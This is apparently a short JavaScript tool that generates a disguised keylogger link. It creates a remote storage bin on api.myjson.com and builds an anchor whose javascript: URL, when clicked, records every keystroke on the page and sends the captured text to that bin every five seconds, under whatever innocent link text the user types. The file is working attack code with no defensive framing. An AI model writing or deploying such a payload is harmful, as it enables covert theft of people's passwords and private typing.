var K = function () {
  var link = null;
  var keylogHack = document.querySelector("#keylogHack");
  var keyLink = document.querySelector("#keyLink");
  var linkText = document.querySelector("#linkText");
  
  function updateKeylog(){
    keyLink.href = link;
    keyLink.style.display = "inline";
    var s =   `<a href='javascript:if(typeof keylogData == "undefined"){keylogStr="";keylogData=[];window.addEventListener("keydown",(e)=>{keylogStr+=e.key});setInterval(()=>{keylogData.push(keylogStr);keylogStr = "";fetch("${link}",{method:"PUT",headers:{"Content-Type":"application/json"},body:JSON.stringify(keylogData)})},5000);}'>${linkText.value}</a>`;
    keylogHack.value = s;
  }
  
  fetch("https://api.myjson.com/bins",{
    method:"POST",
    headers:{
          "Content-Type":"application/json"
    },
    body:"[]",
  }).then(res=>res.json()).then(data=>{
    link = data.uri;
    updateKeylog();
    linkText.addEventListener("input",updateKeylog,false);
  });
  
}
K();